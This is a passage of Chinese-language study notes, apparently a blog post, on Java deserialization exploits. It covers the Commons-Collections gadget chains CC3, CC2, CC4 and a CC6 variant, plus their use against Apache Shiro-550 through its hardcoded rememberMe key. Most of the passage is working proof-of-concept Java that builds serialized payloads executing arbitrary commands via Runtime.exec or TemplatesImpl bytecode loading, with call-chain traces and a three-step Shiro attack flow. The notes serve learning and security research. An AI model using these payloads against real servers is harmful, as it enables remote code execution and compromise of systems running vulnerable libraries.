        <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Serializable <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; command &#125;;<br><br>        <span class="hljs-keyword">final</span> Transformer[] fake = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;;<br><br>        <span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                        String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                        <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                        Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>                        <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, execArgs),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fake);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(entry, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br><br>        Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br>        lazyMap.remove(<span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br></code></pre></td></tr></table></figure>


    ![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%208.png)

    **注**：这里最后需要加一个 `lazyMap.remove(&quot;foo&quot;);` 原因在于在构造过程中由于会触发一次 put 操作，虽然这时我们没有加上 RCE gadget，但是还是会将 `TiedMapEntry` 中的 key 加入到 lazymap 中，因此需要在最后将其移出，否则如图所示调用链中断

    <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>            HashSet.readObject()<br>                HashMap.put()<br>                HashMap.hash()<br>                    TiedMapEntry.hashCode()<br>                    TiedMapEntry.getValue()<br>                        LazyMap.get()<br>                            ChainedTransformer.transform()<br>                            InvokerTransformer.transform()<br>                            Method.invoke()<br>                                Runtime.exec()<br>---------------------------------------------------------------------<br>ObjectInputStream.readObject()<br>            HashMap.readObject()<br>                HashMap.hash()<br>                    TiedMapEntry.hashCode()<br>                    TiedMapEntry.getValue()<br>                        LazyMap.get()<br>                            ChainedTransformer.transform()<br>                            InvokerTransformer.transform()<br>                            Method.invoke()<br>                                Runtime.exec()<br></code></pre></td></tr></table></figure>
</code></pre><h2 id="0x04-CC3-动态加载字节码-——-templatesImpl-上场！"><a href="#0x04-CC3-动态加载字节码-——-templatesImpl-上场！" class="headerlink" title="0x04. CC3 动态加载字节码 —— templatesImpl 上场！"></a>0x04. <strong><strong>CC3 动态加载字节码 ——</strong></strong> <code>templatesImpl</code> 上场！</h2><hr>
<ul>
<li><p>特殊的类加载——远程类加载 <code>java.net.URLClassLoader</code></p>
<blockquote>
<p>正常情况下，Java 会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code> 中列举到的基础路径（这些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找 .class 文件来加载，而这个基础路径有分为三种情况：</p>
<ul>
<li>URL未以斜杠 / 结尾，则认为是一个 JAR 文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找 .class 文件</li>
<li>URL以斜杠 / 结尾，且协议名是 file ，则使用 <code>FileLoader</code> 来寻找类，即为在<strong>本地文件系统</strong>中寻找 .class 文件</li>
<li>URL以斜杠 / 结尾，且协议名不是 file ，则使用<code>最基础的 Loader</code> 来寻找类</li>
</ul>
</blockquote>
</li>
<li><p><strong><strong>TemplatesImpl 加载任意字节码的利器</strong></strong></p>
<p>  sink 点：<code>org.apache.xalan.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass</code></p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%209.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%209.png" alt="Untitled"></p>
<p>  可以调用的 gadget:</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() <br>		-&gt; TemplatesImpl#newTransformer() <br>		-&gt; TemplatesImpl#getTransletInstance() <br>		-&gt; TemplatesImpl#defineTransletClasses()<br>					-&gt; TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure>
<blockquote>
<p>利用条件：</p>
<ol>
<li><p><code>_bytecodes</code> 是由字节码组成的数组；</p>
<p> 其中字节码构成的类的必要条件：必须是<strong><code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></strong> 的<strong>子类</strong></p>
</li>
<li><p><code>_name</code> 可以是任意字符串，只要不为 null 即可；</p>
</li>
<li><code>_tfactory</code> 需要是一个 <code>TransformerFactoryImpl</code> 对象，因为 <code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code> ，如果是 null 会出错。</li>
</ol>
<p><code>TemplatesImpl</code> 是对 JAXP 标准中 <code>javax.xml.transform.Templates</code> 接口的实现，前文说了，XSLT 在使用时会先编译成 Java 字节码，这也就是为什么 <code>TemplatesImpl</code> 会使用 <code>defineClass</code> 的原因</p>
</blockquote>
</li>
<li><strong><strong>BCEL ClassLoader</strong></strong> 另一加载 ByteCode 利器</li>
<li><p>CC3</p>
<ul>
<li><p>出现的原因：</p>
<p>  <code>InvokerTransformer</code> 被 ban</p>
</li>
<li><p>版本限制：jdk ≤ 8u71</p>
<p>  依赖限制：<code>commons-collections:3.1</code></p>
</li>
<li><p><code>TrAXFilter</code> 触发器</p>
<p>  这里看到其构造函数中直接存在 <code>TemplatesImpl</code> 的调用链入口点</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2010.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2010.png" alt="Untitled"></p>
<p>  <code>InstantiateTransformer</code> 新的 Transformer </p>
<p>  在 transform 时会调用 input 对象指定参数的构造器，配合 <code>TrAXFilter</code> 我们设置 <code>iParamTypes</code> 字段为 <code>Templates.class</code> ， <code>iArgs</code> 为构造好的 <code>templatesImpl</code> 即可</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2011.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2011.png" alt="Untitled"></p>
</li>
<li><p>POC</p>
<p>  后面的构造与 CC1 一致</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);<br><br>		<span class="hljs-comment">// inert chain for setup</span><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<br>			<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>) &#125;);<br>		<span class="hljs-comment">// real chain for after setup</span><br>		<span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>				<span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>						<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>						<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templatesImpl &#125; )&#125;;<br><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);<br><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);<br><br>		Reflections.setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers); <span class="hljs-comment">// arm with actual transformer chain</span><br><br>		<span class="hljs-keyword">return</span> handler;<br>	&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="0x05-Shiro-中的应用"><a href="#0x05-Shiro-中的应用" class="headerlink" title="0x05. Shiro 中的应用"></a>0x05. Shiro 中的应用</h2><hr>
<ul>
<li>shiro-550 采用 AES 对 cookie 字段的认证信息进行加密，且加密密钥直接硬编码在了代码当中</li>
<li>攻击流程<ol>
<li>使用以前学过的CommonsCollections利用链生成一个序列化Payload</li>
<li>使用Shiro默认Key进行加密</li>
<li>将密文作为rememberMe的Cookie发送给服务端</li>
</ol>
</li>
<li><p>CC6 利用限制：</p>
<blockquote>
<p><strong>如果反序列化流中包含非 Java 自身的数组，则会出现无法加载类的错误。这就解释了为什么 CommonsCollections6 无法利用了，因为其中用到了 Transformer 数组</strong>。</p>
</blockquote>
</li>
<li><p>简单修改 CC6 使其适配 shiro</p>
<p>  首先原因出在了我们使用 <strong>Transformer</strong> 数组上，因此修改的方向也是不使用非原生数组类型的对象来构造 exp</p>
<p>  这里借助 LazyMap get 方法传入的参数来完成调用链的衔接。以往是直接忽略参数的，因为 factory 是个自闭合的 transformer[] ，当前 transformer 的 transform 方法参数都由前一个调用结果获得，这里我们利用 get 方法的参数 key 来手动传入即可</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2012.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2012.png" alt="Untitled"></p>
<p>  开头还是 CC6 的老套件，key 可以充当 <code>ConstantTransformer</code> 的作用，传入构造好的 templatesImpl 对象，然后利用 InvokerTransformer 调用 <code>newTransformer</code> 方法实现恶意类加载</p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2013.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2013.png" alt="Untitled"></p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Serializable <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templatesImpl);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">HashMap</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(entry, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br><br>        lazyMap.clear();<br>        Reflections.setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="CC2-CC4"><a href="#CC2-CC4" class="headerlink" title="CC2-CC4"></a>CC2-CC4</h2><hr>
<ul>
<li><p>限制</p>
<p>  <code>commons-collections4:4.0</code></p>
</li>
<li><p>CC2</p>
<ul>
<li><p>触发器</p>
<p>  <code>java.util.PriorityQueue#readObject()</code> ⇒ … ⇒ <code>java.util.PriorityQueue#siftDownUsingComparator()</code></p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2014.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2014.png" alt="Untitled"></p>
<p>  <code>TransformingComparator</code> </p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2015.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2015.png" alt="Untitled"></p>
<p class='item-img' data-src='/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2016.png'><img src="/2023/08/10/Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2016.png" alt="Untitled"></p>
</li>
<li><p>POC 构造</p>
<p>  gadget：</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget chain:<br>		ObjectInputStream.readObject()<br>			PriorityQueue.readObject()<br>				...<br>					TransformingComparator.compare()<br>						InvokerTransformer.transform()<br>							Method.invoke()<br>								Runtime.exec()<br></code></pre></td></tr></table></figure>
<p>  根据 <code>TransformingComparator#compare()</code> 的描述，要么直接往 transformer 里塞一个构造好的 Transformer[]，要么参照上文 templatesImpl 类加载的方式，参数传入手动构造 gadget</p>
<p>  yso 项目采用的第二种方式：</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Queue&lt;Object&gt; <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);<br>		<span class="hljs-comment">// mock method name until armed</span><br>		<span class="hljs-keyword">final</span> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br><br>		<span class="hljs-comment">// create queue with numbers and basic comparator</span><br>		<span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer));<br>		<span class="hljs-comment">// stub data for replacement later</span><br>		queue.add(<span class="hljs-number">1</span>);<br>		queue.add(<span class="hljs-number">1</span>);<br><br>		<span class="hljs-comment">// switch method called by comparator</span><br>		Reflections.setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>		<span class="hljs-comment">// switch contents of queue</span><br>		<span class="hljs-keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>);<br>		queueArray[<span class="hljs-number">0</span>] = templates;<br>		queueArray[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><br>		<span class="hljs-keyword">return</span> queue;<br>	&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    **注**：`TransformingComparator` 只能在 CC4 版本中使用，之前的版本并未实现 `Serializable` 接口


![Untitled](Java%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cf32e5b66f974fa48c4a25d75639abd2/Untitled%2017.png)
</code></pre><ul>
<li><p>CC4</p>
<p>  实际上就是 CC3 前半段利用 <code>TrAXFilter</code> 构造函数加载 <code>templatesImpl</code> 恶意类加载与后半段 <code>PriorityQueue</code> 反序列化触发链的结合</p>
<ul>
<li><p>Java Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Queue&lt;Object&gt; <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-type">Object</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> Gadgets.createTemplatesImpl(command);<br><br>		<span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">constant</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(String.class);<br><br>		<span class="hljs-comment">// mock method name until armed</span><br>		Class[] paramTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;;<br>		Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;foo&quot;</span> &#125;;<br>		<span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>				paramTypes, args);<br><br>		<span class="hljs-comment">// grab defensively copied arrays</span><br>		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="hljs-string">&quot;iParamTypes&quot;</span>);<br>		args = (Object[]) Reflections.getFieldValue(instantiate, <span class="hljs-string">&quot;iArgs&quot;</span>);<br><br>		<span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123; constant, instantiate &#125;);<br><br>		<span class="hljs-comment">// create queue with numbers</span><br>		PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chain));<br>		queue.add(<span class="hljs-number">1</span>);<br>		queue.add(<span class="hljs-number">1</span>);<br><br>		<span class="hljs-comment">// swap in values to arm</span><br>		Reflections.setFieldValue(constant, <span class="hljs-string">&quot;iConstant&quot;</span>, TrAXFilter.class);<br>		paramTypes[<span class="hljs-number">0</span>] = Templates.class;<br>		args[<span class="hljs-number">0</span>] = templates;<br><br>		<span class="hljs-keyword">return</span> queue;<br>	&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><hr>
<ul>
<li><p>版本限制</p>
<blockquote>
